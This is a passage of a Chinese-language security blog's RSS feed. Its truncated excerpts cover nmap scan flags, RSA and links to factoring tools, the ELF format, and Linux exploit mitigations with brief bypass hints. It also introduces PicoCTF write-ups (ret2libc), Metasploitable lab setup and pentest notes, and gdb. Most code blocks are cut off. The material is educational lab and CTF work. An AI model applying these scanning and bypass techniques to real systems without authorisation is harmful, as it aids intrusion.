+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>nmap -sC -sV &amp;lt;ip/hostname&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>-sC: 使用預設的Nmap腳本(&amp;ndash;script=default)&lt;/li>
+&lt;li>-sV: 啟用版本偵測(-A)&lt;/li>
+&lt;li>-T4: 設定掃描速度為4(1-5)，預設為3&lt;/li>
+&lt;li>-sS: 送TCP SYN封包來掃描&lt;/li>
+&lt;li>-sT: 掃描時使用系統呼叫API送封包(猜作業系統版本，需要root)&lt;/li>
+&lt;li>-p: 指定port&lt;/li>
+&lt;li>-Pn: 跳過Ping掃描，全當存活服務(避免防火牆拒絕)&lt;/li>
+&lt;li>-4: 強制使用IPv4&lt;/li>
+&lt;li>-6: 強制使用IPv6&lt;/li>
+&lt;/ul></description></item><item><title>【CTF】密碼學-RSA加密演算法</title><link>https://ja-errorpro.codes/posts/2023/rsa/</link><pubDate>Fri, 03 Nov 2023 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2023/rsa/</guid><description>&lt;h1 id="rsa加密演算法">RSA加密演算法&lt;/h1>
+&lt;h2 id="簡介">簡介&lt;/h2>
+&lt;ul>
+&lt;li>由三位數學家Rivest、Shamir、Adleman所提出，RSA就是他們的姓氏第一個字母組成的。&lt;/li>
+&lt;li>非對稱加密演算法(公鑰加密演算法)。&lt;/li>
+&lt;li>一般有1024、2048、4096位的金鑰長度，位是二進位位元數&lt;/li>
+&lt;/ul>
+&lt;h2 id="生成金鑰過程">生成金鑰過程&lt;/h2>
+&lt;ol>
+&lt;li>選兩個質數$p$、$q$，$p\neq q$。&lt;/li>
+&lt;li>算 $\phi(pq) $，其中 $\phi(n)$ 為歐拉函數，表示小於 $n$ 且與 $n$ 互質的正整數個數，歐拉定理 $\phi(pq) = (p-1)(q-1)$。&lt;/li>
+&lt;li>選一個數 $e$，使 $1 \leq e \leq \phi(pq)$ 且 $e$ 與 $\phi(pq)$ 互質。&lt;/li>
+&lt;li>找一個數 $d$，使 $ed \equiv 1 \pmod{\phi(pq)}$，即 $ed$ 除以 $phi(pq)$ 的餘數 $ = 1$。
+4-1. 這步就是在求 $e$ 關於 $\phi(pq)$ 的模逆元，可以用擴展歐幾里得法求，參考：&lt;a href="https://ja-errorpro.codes/posts/1/algo-number-theory/#%E8%B2%9D%E7%A5%96%E5%AE%9A%E7%90%86bezouts-thm">算法筆記-數論&lt;/a>&lt;/li>
+&lt;li>$p$、$q$、$e$ 組成公鑰 $(n,e)$，$p$、$q$、$d$ 組成私鑰 $(n,d)$。&lt;/li>
+&lt;/ol>
+&lt;h2 id="加密過程">加密過程&lt;/h2>
+&lt;ol>
+&lt;li>將明文字串 $m$ 轉換成數字(ASCII)陣列。&lt;/li>
+&lt;li>一個數一個數加密，設數字為 $x$，計算 $x^e\ mod\ n$，得到密文。&lt;/li>
+&lt;li>把這些密文再組合起來&lt;/li>
+&lt;/ol>
+&lt;h2 id="解密過程">解密過程&lt;/h2>
+&lt;ol>
+&lt;li>把密文拆開，一個數一個數解密，設數字為 $y$，計算 $y^d\ mod\ n$，得到明文。&lt;/li>
+&lt;li>把這些明文再組合起來&lt;/li>
+&lt;/ol>
+&lt;h2 id="攻擊">攻擊&lt;/h2>
+&lt;p>&lt;a href="https://github.com/aleaxit/gmpy">gmpy2&lt;/a>
+&lt;a href="http://factordb.com">線上分解n&lt;/a>
+&lt;a href="https://github.com/RsaCtfTool/RsaCtfTool">RSACTFTool&lt;/a>&lt;/p></description></item><item><title>【系統安全】ELF檔案格式</title><link>https://ja-errorpro.codes/posts/2023/elf/</link><pubDate>Wed, 25 Oct 2023 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2023/elf/</guid><description>&lt;h1 id="elf檔案格式">ELF檔案格式&lt;/h1>
+&lt;h2 id="elfexecutable-and-linkable-format">ELF(Executable and Linkable Format)&lt;/h2>
+&lt;ul>
+&lt;li>可執行可連結格式&lt;/li>
+&lt;li>定義：&lt;code>/usr/include/elf.h&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;h2 id="類型">類型&lt;/h2>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+&lt;/span>&lt;/code>&lt;/pr</description></item><item><title>【系統安全】Linux 安全機制</title><link>https://ja-errorpro.codes/posts/2023/linux_system_security/</link><pubDate>Sun, 22 Oct 2023 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2023/linux_system_security/</guid><description>&lt;h2 id="address-space-layout-randomizationaslr">Address space layout randomization(ASLR):&lt;/h2>
+&lt;p>記憶體隨機載入，會把.stack section, .so section, mmap()隨機化，可以防止攻擊者跳到指定記憶體任意利用&lt;/p>
+&lt;p>繞過：目前沒有很好的繞過方法，只能靠運氣猜記憶體在哪&lt;/p>
+&lt;h2 id="stack-canary">Stack Canary:&lt;/h2>
+&lt;p>金絲雀，在以前礦工在挖礦的時候會帶一隻金絲雀下去，如果金絲雀暈倒表示可能挖到有毒氣體了，要趕快跑，在程式裡面也會有這樣的機制，每次執行一個函數會先養一隻金絲雀(一個隨機數)，如果攻擊者傷害到那隻金絲雀(覆寫掉隨機數)就表示受到攻擊，程式在函式離開前檢查到就會直接停止&lt;/p>
+&lt;p>繞過：只要不碰到金絲雀，或推算出金絲雀長什麼樣子就能繞過&lt;/p>
+&lt;h2 id="no-executenx">No-eXecute(NX):&lt;/h2>
+&lt;p>堆疊不可執行，把記憶體的stack標記為不可執行，可以防止攻擊者跳到堆疊任意寫程式&lt;/p>
+&lt;p>繞過：不要跳到stack，那跳到text就好了&lt;/p>
+&lt;h2 id="pieposition-independent-executable">PIE(Position Independent Executable):&lt;/h2>
+&lt;p>記憶體隨機化，跟ASLR很像，但是是在編譯器上做好，會把.text section, .data section, .bss section隨機化&lt;/p>
+&lt;p>繞過：讓程式執行的過程中洩露記憶體然後就能推算&lt;/p>
+&lt;p>程式實際位址 = 程式加載位址 + 偏移位址&lt;/p>
+&lt;h2 id="fortify-source">Fortify Source:&lt;/h2>
+&lt;p>在編譯時檢查是否存在buffer overflow，並將危險函式替換成安全函式，例如strcpy()會被替換成strncpy()&lt;/p>
+&lt;h2 id="relrorelocation-read-only">RELRO(RELocation Read-Only):&lt;/h2>
+&lt;p>在Lazy Binding時，會將.got.plt section設為read-only，可以防止攻擊者修改.got.plt section&lt;/p></description></item><item><title>【系統安全】組合語言</title><link>https://ja-errorpro.codes/posts/2023/asm/</link><pubDate>Sun, 22 Oct 2023 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2023/asm/</guid><description>&lt;h1 id="組合語言">組合語言&lt;/h1>
+&lt;h2 id="編譯流程">編譯流程&lt;/h2>
+&lt;ol>
+&lt;li>詞法分析 (Lexical Analysis)&lt;/li>
+&lt;/ol>
+&lt;p>切token -&amp;gt; 詞素 (Lexeme)&lt;/p>
+&lt;ol start="2">
+&lt;li>語法分析 (Syntax Analysis)&lt;/li>
+&lt;/ol>
+&lt;p>建立語法樹 (Syntax Tree)&lt;/p>
+&lt;ol start="3">
+&lt;li>語意分析 (Semantic Analysis)&lt;/li>
+&lt;/ol>
+&lt;p>用語法樹跟符號表 (Symbol Table) 來檢查語意&lt;/p>
+&lt;ol start="4">
+&lt;li>
+&lt;p>中間碼產生 (Intermediate Code Generation)&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>最佳化 (Optimization)&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>目標碼產生 (Code Generation)&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;h2 id="gcc編譯流程">GCC編譯流程&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th style="text-align: left">&lt;/th>
+ &lt;th style="text-align: left">前置處理 (Preprocessing)&lt;/th>
+ &lt;th style="text-align: left">-&amp;gt; 編譯 (Compilation)&lt;/th>
+ &lt;th style="text-align: left">-&amp;gt; 組譯 (Assembly)&lt;/th>
+ &lt;th style="text-align: left">-&amp;gt; 連結 (Linking)&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td style="text-align: left">檔案副檔名&lt;/td>
+ &lt;td style="text-align: left">(.i)&lt;/td>
+ &lt;td style="text-align: left">(.s)&lt;/td>
+ &lt;td style="text-align: left">(.o)&lt;/td>
+ &lt;td style="text-align: left">(.out)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: left">指令參數&lt;/td>
+ &lt;td style="text-align: left">-E&lt;/td>
+ &lt;td style="text-align: left">-S&lt;/td>
+ &lt;td style="text-align: left">-c&lt;/td>
+ &lt;td style="text-align: left">&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;h3 id="前置處理-preprocessing">前置處理 (Preprocessing)&lt;/h3>
+&lt;ul>
+&lt;li>遞迴處理所有 &lt;code>#include&lt;/code>&lt;/li>
+&lt;li>遞迴展開所有 &lt;code>#define&lt;/code>&lt;/li>
+&lt;li>刪除所有註解&lt;/li>
+&lt;li>處理所有 &lt;code>#if&lt;/code> &lt;code>#ifdef&lt;/code> &lt;code>#ifndef&lt;/code> &lt;code>#else&lt;/code> &lt;code>#endif&lt;/code>&lt;/li>
+&lt;li>行號記錄&lt;/li>
+&lt;/ul>
+&lt;h3 id="編譯-compilation">編譯 (Compilation)&lt;/h3>
+&lt;p>組語格式：預設 AT&amp;amp;T 語法，可用 &lt;code>-masm=intel&lt;/code> 改成 Intel 語法&lt;/p></description></item><item><title>【CTF-WriteUp】PicoCTF-Here's a LIBC</title><link>https://ja-errorpro.codes/posts/2023/ctf_picoctf_heresalibc/</link><pubDate>Fri, 20 Oct 2023 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2023/ctf_picoctf_heresalibc/</guid><description>&lt;p>題目：&lt;/p>
+&lt;pre>&lt;code>給你指定的libc與elf file請pwn掉它
+&lt;/code>&lt;/pre>
+&lt;h1 id="概念">概念：&lt;/h1>
+&lt;ul>
+&lt;li>組合語言課學的各種東西&lt;/li>
+&lt;li>逆向工程&lt;/li>
+&lt;li>Little endian&lt;/li>
+&lt;li>stack frame&lt;/li>
+&lt;li>ELF format&lt;/li>
+&lt;li>ret2libc&lt;/li>
+&lt;/ul>
+&lt;h1 id="題解">題解：&lt;/h1>
+&lt;h3 id="執行-file-查看檔案屬性">執行 file 查看檔案屬性&lt;/h3>
+&lt;p>&lt;img src="https://ja-errorpro.codes/images/ctf/picoctf_heresalibc/file.png" alt="checksec">&lt;/p>
+&lt;p>這是一個64位ELF格式可執行檔&lt;/p>
+&lt;h3 id="執行-checksec-查看安全屬性">執行 checksec 查看安全屬性&lt;/h3>
+&lt;p>&lt;img src="https://ja-errorpro.codes/images/ctf/picoctf_heresalibc/checksec.png" alt="checksec">&lt;/p>
+&lt;p>只開了 NX(No-Execute, 堆疊不可執行)&lt;/p>
+&lt;h3 id="拿去ghidra或ida逆向">拿去Ghidra或IDA逆向&lt;/h3>
+&lt;p>看起來會用到的函式：&lt;/p>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+&lt;/span>&lt;/code>&lt;/pr</description></item><item><title>【資訊安全】Metasploitable3 環境建置(Windows VMware)</title><link>https://ja-errorpro.codes/posts/2022/metasploitable3_installation/</link><pubDate>Tue, 29 Nov 2022 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2022/metasploitable3_installation/</guid><description>&lt;h2 id="需求">需求&lt;/h2>
+&lt;ul>
+&lt;li>Windows 10 up&lt;/li>
+&lt;li>VMware Workstation Pro&lt;/li>
+&lt;li>良好的網路環境&lt;/li>
+&lt;/ul>
+&lt;h2 id="1-下載並安裝-vagrant--vagrant-vmware-utility">1. 下載並安裝 Vagrant &amp;amp; Vagrant VMware Utility&lt;/h2>
+&lt;p>Vagrant 是建置虛擬機的工具，透過 Vagrantfile 來設定虛擬機。&lt;/p>
+&lt;p>&lt;a href="https://developer.hashicorp.com/vagrant/downloads">Download Vagrant&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://developer.hashicorp.com/vagrant/downloads/vmware">Download Vagrant VMware Utility&lt;/a>&lt;/p>
+&lt;h2 id="2-快速建置">2. 快速建置&lt;/h2>
+&lt;p>打開 PowerShell，cd 到適當的資料夾，依序輸入&lt;/p>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+&lt;/span>&lt;/code>&lt;/pr</description></item><item><title>【資訊安全】Metasploitable2 滲透測試實作(筆記)</title><link>https://ja-errorpro.codes/posts/2022/metasploitable2_vsftpd/</link><pubDate>Wed, 23 Nov 2022 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2022/metasploitable2_vsftpd/</guid><description>&lt;h2 id="先備知識">先備知識&lt;/h2>
+&lt;ul>
+&lt;li>知道如何使用 VMware 或 VirtualBox&lt;/li>
+&lt;li>Kali Linux 基本操作&lt;/li>
+&lt;li>能夠讓 Kali 連線至 Metasploitable2&lt;/li>
+&lt;/ul>
+&lt;h2 id="metasploitable2">Metasploitable2&lt;/h2>
+&lt;p>一種充滿漏洞的Linux系統，適合用於練習滲透測試。&lt;/p>
+&lt;p>可直接到 &lt;a href="https://sourceforge.net/projects/metasploitable/">Sourceforge&lt;/a> 上下載虛擬機檔。&lt;/p>
+&lt;h2 id="偵查">偵查&lt;/h2>
+&lt;ol>
+&lt;li>
+&lt;p>開啟 Metasploitable2，會先要求輸入帳號密碼，帳密都是 &lt;code>msfadmin&lt;/code> (輸入密碼時不會顯示在螢幕上)。&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>輸入 &lt;code>ifconfig&lt;/code> 查看 IP 位址，假設為 &lt;code>192.168.235.130&lt;/code>。&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>打開 Kali Linux (IP為192.168.235.128)，終端輸入 &lt;code>msfconsole&lt;/code> 進入 Metasploit。&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;p>&lt;img src="https://ja-errorpro.codes/images/metasploitable2/kali_linux_msfconsole.png" alt="msfconsole">&lt;/p>
+&lt;ol start="4">
+&lt;li>使用 nmap 掃描可以連的 port&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pr</description></item><item><title>【CTF-WriteUp】PicoCTF-file-run2</title><link>https://ja-errorpro.codes/posts/2022/ctf_picoctf_file_run2/</link><pubDate>Tue, 04 Oct 2022 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2022/ctf_picoctf_file_run2/</guid><description>&lt;p>題目：&lt;/p>
+&lt;pre>&lt;code>給你一個檔案，執行它時輸入&amp;quot;Hello!&amp;quot;(不含引號)。
+&lt;/code>&lt;/pre>
+&lt;h1 id="概念">概念：&lt;/h1>
+&lt;ul>
+&lt;li>逆向工程&lt;/li>
+&lt;li>Linux 指令操作&lt;/li>
+&lt;li>Linux 權限控制&lt;/li>
+&lt;/ul>
+&lt;h1 id="題解">題解&lt;/h1>
+&lt;p>丟進IDA看看，發現確實只要輸入Hello!就能跑出Flag，&lt;/p>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+&lt;/span>&lt;/code>&lt;/pr</description></item><item><title>gdb 除錯工具學習</title><link>https://ja-errorpro.codes/posts/2022/gdb/</link><pubDate>Mon, 26 Sep 2022 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2022/gdb/</guid><description>&lt;h1 id="what-is-gdb">What is GDB?&lt;/h1>
+&lt;p>gdb全名為gnu debugger，是一種動態Debug的工具。&lt;/p>
+&lt;h1 id="使用">使用&lt;/h1>
+&lt;p>我們可以先寫一個簡易的Hello World，並宣告一些變數&lt;/p>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
